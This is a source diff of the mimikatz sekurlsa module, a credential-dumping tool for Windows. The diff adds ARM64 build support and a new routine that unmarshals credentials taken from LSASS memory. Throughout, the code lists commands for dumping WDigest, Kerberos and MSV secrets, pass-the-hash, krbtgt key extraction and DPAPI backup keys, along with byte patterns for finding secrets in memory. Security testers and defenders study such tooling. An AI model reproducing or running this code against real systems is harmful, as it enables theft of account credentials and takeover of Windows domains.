@@ -10,7 +10,9 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_wdigest,			L"wdigest",			L"Lists WDigest credentials"},
 	{kuhl_m_sekurlsa_kerberos,			L"kerberos",		L"Lists Kerberos credentials"},
 	{kuhl_m_sekurlsa_tspkg,				L"tspkg",			L"Lists TsPkg credentials"},
+#if !defined(_M_ARM64)
 	{kuhl_m_sekurlsa_livessp,			L"livessp",			L"Lists LiveSSP credentials"},
+#endif
 	{kuhl_m_sekurlsa_ssp,				L"ssp",				L"Lists SSP credentials"},
 	{kuhl_m_sekurlsa_all,				L"logonPasswords",	L"Lists all available providers credentials"},
 
@@ -18,9 +20,11 @@ const KUHL_M_C kuhl_m_c_sekurlsa[] = {
 	{kuhl_m_sekurlsa_minidump,			L"minidump",		L"Switch (or reinit) to LSASS minidump context"},
 
 	{kuhl_m_sekurlsa_pth,				L"pth",				L"Pass-the-hash"},
+#if !defined(_M_ARM64)
 	{kuhl_m_sekurlsa_krbtgt,			L"krbtgt",			L"krbtgt!"},
+#endif
 	{kuhl_m_sekurlsa_dpapi_system,		L"dpapisystem",		L"DPAPI_SYSTEM secret"},
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 	{kuhl_m_sekurlsa_trust,				L"trust",			L"Antisocial"},
 	{kuhl_m_sekurlsa_bkeys,				L"backupkeys",		L"Preferred Backup Master keys"},
 #endif
@@ -40,7 +44,9 @@ const PKUHL_M_SEKURLSA_PACKAGE lsassPackages[] = {
 	&kuhl_m_sekurlsa_msv_package,
 	&kuhl_m_sekurlsa_tspkg_package,
 	&kuhl_m_sekurlsa_wdigest_package,
+#if !defined(_M_ARM64)
 	&kuhl_m_sekurlsa_livessp_package,
+#endif
 	&kuhl_m_sekurlsa_kerberos_package,
 	&kuhl_m_sekurlsa_ssp_package,
 	&kuhl_m_sekurlsa_dpapi_svc_package,
@@ -59,9 +65,11 @@ const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 };
 
 const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
+#if !defined(_M_ARM64)
 	{kuhl_m_sekurlsa_nt5_init,	kuhl_m_sekurlsa_nt5_clean,	kuhl_m_sekurlsa_nt5_acquireKeys,	&kuhl_m_sekurlsa_nt5_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory},
+#endif
 	{kuhl_m_sekurlsa_nt6_init,	kuhl_m_sekurlsa_nt6_clean,	kuhl_m_sekurlsa_nt6_acquireKeys,	&kuhl_m_sekurlsa_nt6_pLsaProtectMemory,	&kuhl_m_sekurlsa_nt6_pLsaUnprotectMemory},
-#ifdef LSASS_DECRYPT
+#if defined(LSASS_DECRYPT)
 	{kuhl_m_sekurlsa_nt63_init,	kuhl_m_sekurlsa_nt63_clean,	kuhl_m_sekurlsa_nt63_acquireKeys,	&kuhl_m_sekurlsa_nt63_pLsaProtectMemory,&kuhl_m_sekurlsa_nt63_pLsaUnprotectMemory},
 #endif
 };
@@ -120,11 +128,16 @@ NTSTATUS kuhl_m_sekurlsa_minidump(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_sekurlsa_init()
 {
-	lsassLocalHelper = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
-	#ifdef LSASS_DECRYPT
-		((MIMIKATZ_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
+	lsassLocalHelper =
+	#if defined(_M_ARM64)
+		&lsassLocalHelpers[0]
 	#else
-		&lsassLocalHelpers[1]
+		lsassLocalHelper = (MIMIKATZ_NT_MAJOR_VERSION < 6) ? &lsassLocalHelpers[0] : 
+		#if defined(LSASS_DECRYPT)
+			((MIMIKATZ_NT_BUILD_NUMBER != 9431) ? &lsassLocalHelpers[1] : &lsassLocalHelpers[2])
+		#else
+			&lsassLocalHelpers[1]
+		#endif
 	#endif
 		;
 	return STATUS_SUCCESS;
@@ -183,10 +196,10 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 
 							if(isError = (cLsass.osContext.MajorVersion != MIMIKATZ_NT_MAJOR_VERSION) && !(MIMIKATZ_NT_MAJOR_VERSION >= 6 && cLsass.osContext.MajorVersion >= 6))
 								PRINT_ERROR(L"Minidump pInfos->MajorVersion (%u) != MIMIKATZ_NT_MAJOR_VERSION (%u)\n", pInfos->MajorVersion, MIMIKATZ_NT_MAJOR_VERSION);
-						#ifdef _M_X64
+						#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64))
 								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_AMD64 (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_AMD64);
-						#elif defined _M_IX86
+						#elif defined(_M_IX86)
 							else if(isError = (pInfos->ProcessorArchitecture != PROCESSOR_ARCHITECTURE_INTEL))
 								PRINT_ERROR(L"Minidump pInfos->ProcessorArchitecture (%u) != PROCESSOR_ARCHITECTURE_INTEL (%u)\n", pInfos->ProcessorArchitecture, PROCESSOR_ARCHITECTURE_INTEL);
 						#endif
@@ -199,7 +212,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 					}
 					else
 					{
-					#ifdef _M_IX86
+					#if defined(_M_IX86)
 						if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
 							PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
 						else
@@ -213,7 +226,9 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 					
 					if(!isError)
 					{
+						#if !defined(_M_ARM64)
 						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
+						#endif
 						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
 
 						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
@@ -417,7 +432,8 @@ NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPack
 	return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &OptionalData);
 }
 
-#ifdef _M_X64
+#if !defined(_M_ARM64) // No DC on ARM64, for now?
+#if defined(_M_X64)
 BYTE PTRN_W2K3_SecData[]	= {0x48, 0x8d, 0x6e, 0x30, 0x48, 0x8d, 0x0d};
 BYTE PTRN_W2K8_SecData[]	= {0x48, 0x8d, 0x94, 0x24, 0xb0, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d};
 BYTE PTRN_W2K12_SecData[]	= {0x4c, 0x8d, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8d, 0x15};
@@ -429,7 +445,7 @@ KULL_M_PATCH_GENERIC SecDataReferences[] = {
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, {-12, 39}},
 	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_W2K12R2_SecData),	PTRN_W2K12R2_SecData},	{0, NULL}, { -9, 39}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_W2K3_SecData[]	= {0x53, 0x56, 0x8d, 0x45, 0x98, 0x50, 0xb9};
 BYTE PTRN_W2K8_SecData[]	= {0x8b, 0x45, 0x14, 0x83, 0xc0, 0x18, 0x50, 0xb9};
 KULL_M_PATCH_GENERIC SecDataReferences[] = {
@@ -564,8 +580,9 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 		}
 	}
 }
+#endif
 
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_WI52_SysCred[] = {0xb9, 0x14, 0x00, 0x00, 0x00, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
 BYTE PTRN_WI60_SysCred[] = {0x48, 0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
 BYTE PTRN_WN62_SysCred[] = {0x8b, 0xca, 0xf3, 0xaa, 0x48, 0x8d, 0x3d};
@@ -577,7 +594,7 @@ KULL_M_PATCH_GENERIC SysCredReferences[] = {
 	{KULL_M_WIN_MIN_BUILD_BLUE,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-27, -4,   7}},
 	{KULL_M_WIN_MIN_BUILD_10,		{sizeof(PTRN_WN62_SysCred),		PTRN_WN62_SysCred},		{0, NULL}, {-20, -26,  7}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WI51_SysCred[] = {0x00, 0xab, 0x33, 0xc0, 0xbf};
 BYTE PTRN_WI52_SysCred[] = {0x59, 0x33, 0xd2, 0x88, 0x10, 0x40, 0x49, 0x75};
 BYTE PTRN_WI60_SysCred[] = {0x6a, 0x14, 0x59, 0xb8};
@@ -645,7 +662,7 @@ NTSTATUS kuhl_m_sekurlsa_dpapi_system(int argc, wchar_t * argv[])
 	return status;
 }
 
-#ifdef _M_X64
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 BYTE PTRN_W2K8R2_DomainList[]	= {0xf3, 0x0f, 0x6f, 0x6c, 0x24, 0x30, 0xf3, 0x0f, 0x7f, 0x2d};
 BYTE PTRN_W2K12R2_DomainList[]	= {0x0f, 0x10, 0x45, 0xf0, 0x66, 0x48, 0x0f, 0x7e, 0xc0, 0x0f, 0x11, 0x05};
 KULL_M_PATCH_GENERIC DomainListReferences[] = {
@@ -1230,6 +1247,9 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 					}
 					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
 
+					if(username)
+						kuhl_m_sekurlsa_trymarshal(username);
+
 					if(blob)
 					{
 						kuhl_m_sekurlsa_genericLsaIsoOutput(blob);
@@ -1252,6 +1272,53 @@ VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCred
 			LocalFree(sid);
 	}
 	else kprintf(L"LUID KO\n");
+}
+
+VOID kuhl_m_sekurlsa_trymarshal(PCUNICODE_STRING MarshaledCredential)
+{
+	PWSTR buffer;
+	CRED_MARSHAL_TYPE type;
+	PVOID Credential;
+
+	if(MarshaledCredential->Length && MarshaledCredential->Buffer)
+	{
+		if(buffer = (PWSTR) LocalAlloc(LPTR, MarshaledCredential->Length + sizeof(wchar_t)))
+		{
+			RtlCopyMemory(buffer, MarshaledCredential->Buffer, MarshaledCredential->Length);
+			if(CredIsMarshaledCredential(buffer))
+			{
+				kprintf(L"\n\t * Marshaled: ");
+				if(CredUnmarshalCredential(buffer, &type, &Credential))
+				{
+					switch(type)
+					{
+					case CertCredential:
+						if(((PCERT_CREDENTIAL_INFO) Credential)->cbSize == sizeof(CERT_CREDENTIAL_INFO))
+						{
+							kprintf(L"[Cert] SHA1:");
+							kull_m_string_wprintf_hex(((PCERT_CREDENTIAL_INFO) Credential)->rgbHashOfCert, CERT_HASH_LENGTH, 0);
+						}
+						else PRINT_ERROR(L"Credential->cbSize is %u\n", ((PCERT_CREDENTIAL_INFO) Credential)->cbSize);
+						break;
+					case UsernameTargetCredential:
+						kprintf(L"[UsernameTarget] %s\n", ((PUSERNAME_TARGET_CREDENTIAL_INFO) Credential)->UserName);
+						break;
+					case BinaryBlobCredential:
+						kprintf(L"[BinaryBlob] ");
+						kull_m_string_wprintf_hex(((PBINARY_BLOB_CREDENTIAL_INFO) Credential)->pbBlob, ((PBINARY_BLOB_CREDENTIAL_INFO) Credential)->cbBlob, 1);
+						break;
+					case UsernameForPackedCredentials:
+						kprintf(L"[UsernameForPacked] ?");
+						break;
+					default:
+						kprintf(L"[?] ?");
+					}
+				}
+				else PRINT_ERROR_AUTO(L"CredUnmarshalCredential");
+			}
+			LocalFree(buffer);
+		}
+	}
 }
 
 VOID kuhl_m_sekurlsa_genericKeyOutput(PKIWI_CREDENTIAL_KEY key, LPCWSTR sid)
